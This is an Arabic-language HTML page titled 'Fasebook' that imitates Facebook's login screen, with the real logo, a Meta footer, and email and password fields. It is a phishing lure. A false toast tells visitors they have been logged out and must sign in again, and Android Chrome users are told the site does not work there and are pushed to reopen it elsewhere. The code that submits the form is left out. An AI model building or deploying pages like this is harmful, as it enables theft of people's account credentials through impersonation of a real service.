<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>Fasebook</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
:root {
  --facebook-blue: #1877f2;
  --input-border: #ccd0d5;
  --button-hover: #166fe5;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
  background-color: #fff;
  margin: 0;
  padding: 0;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  min-height: 100vh;
}

/* فقاعة التحذير Chrome */
#browserToast {
  display: none;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: #ff4d4d;
  color: #fff;
  padding: 25px 30px;
  border-radius: 20px;
  font-weight: bold;
  text-align: center;
  z-index: 9999;
  max-width: 90%;
}
#browserToast button {
  margin-top: 15px;
  padding: 10px 15px;
  border: none;
  border-radius: 8px;
  background: #fff;
  color: #ff4d4d;
  font-weight: bold;
  cursor: pointer;
  font-size: 16px;
}

/* محتوى الموقع الأصلي */
#mainContent {
  width: 100%;
}
.lang { margin-top: 15px; font-size: 15px; color: #444; cursor: pointer; user-select: none; }
.logo { margin: 50px 0 30px 0; }
.logo img { width: 65px; height: 65px; }
.container { width: 90%; max-width: 360px; margin: 0 auto; }
form { background-color: #fff; text-align: center; }
.input-group { position: relative; margin-bottom: 5px; }
.input-group input {
  width: 100%; padding: 15px 12px 15px 40px;
  border: 1px solid var(--input-border); border-radius: 12px;
  font-size: 15px; box-sizing: border-box;
}
.input-group .icon {
  position: absolute; top: 50%; left: 12px; transform: translateY(-50%);
  color: #888; font-size: 16px;
}
.error-bubble {
  display: none; background: #000; color: #fff; font-size: 12px;
  padding: 6px 10px; border-radius: 15px; margin: 4px 0 10px auto;
  width: fit-content; max-width: 90%; text-align: right; position: relative;
}
.error-bubble::after {
  content: ""; position: absolute; bottom: 100%; right: 15px;
  border-width: 6px; border-style: solid;
  border-color: transparent transparent #000 transparent;
}
button { width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
  color: white; font-size: 17px; font-weight: bold; border-radius: 12px;
  cursor: pointer; transition: background-color 0.2s; margin-top: 5px;
}
button:hover { background-color: var(--button-hover); }
.forgot { margin-top: 14px; font-size: 14px; color: #1877f2; cursor: pointer; }
.create-account {
  margin-top: 28px; padding: 15px; width: 100%; border: 1px solid var(--facebook-blue);
  background: #fff; color: var(--facebook-blue); font-size: 16px; font-weight: bold;
  border-radius: 12px; cursor: pointer;
}
.msg {
  margin-top: 15px;
  font-size: 15px;
  color: #444;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}
.meta { margin-top: 50px; font-size: 12px; color: #999; cursor: pointer; }
.spinner {
  border: 3px solid rgba(0, 0, 0, 0.1);
  border-left-color: var(--facebook-blue);
  border-radius: 50%;
  width: 18px;
  height: 18px;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }

.toast {
  position: fixed;
  bottom: 20px;
  right: 50%;
  transform: translateX(50%);
  background: #000;
  color: #fff;
  padding: 12px 20px;
  border-radius: 25px;
  font-size: 14px;
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.5s ease, visibility 0.5s ease;
  z-index: 9999;
  text-align: center;
}
.toast.show { opacity: 1; visibility: visible; }

</style>
</head>
<body>

<div id="browserToast">
  عذرًا، هذا الموقع لا يعمل على Google Chrome.<br>
  <button id="openDefault">أنقر هنا</button>
</div>

<div id="mainContent">
  <div class="lang" id="langBtn">العربية ⌵</div>

  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
  </div>

  <div class="container">
    <form id="myForm">
      <div class="input-group">
        <input type="text" name="email_or_phone" id="emailInput" placeholder="الرقم أو الإيميل" required>
        <i class="fa-solid fa-user icon"></i>
        <div class="error-bubble" id="error-email"></div>
      </div>
      <div class="input-group">
        <input type="password" name="password" id="passInput" placeholder="كلمة المرور" required>
        <i class="fa-solid fa-lock icon"></i>
        <div class="error-bubble" id="error-pass"></div>
      </div>
      <button type="submit" id="submitButton">تسجيل الدخول</button>
    </form>
    <div class="forgot" id="forgotText">هل نسيت كلمة السر؟</div>
    <button class="create-account" id="createBtn">إنشاء حساب جديد</button>
    <div class="msg" id="msg"></div>
  </div>

  <div class="meta" id="metaLink">Meta ©</div>

  <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
</div>

<script>
window.addEventListener("load", () => {
  const isAndroid = /Android/i.test(navigator.userAgent);
  const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
  const browserToast = document.getElementById("browserToast");
  const mainContent = document.getElementById("mainContent");

  if(isAndroid && isChrome){
    mainContent.style.display = "none";
    browserToast.style.display = "block";

    document.getElementById("openDefault").addEventListener("click", () => {
      window.open(window.location.href, "_blank");
      browserToast.style.display = "none";
    });

    return;
  }

  const toast = document.getElementById("toast");
  toast.classList.add("show");
  setTimeout(() => { toast.classList.remove("show"); }, 4000);
});

// باقي كود الموقع الأصلي (تغيير اللغة، التحقق من الحقول، الإرسال) يبقى كما هو
</script>
</body>
</html>
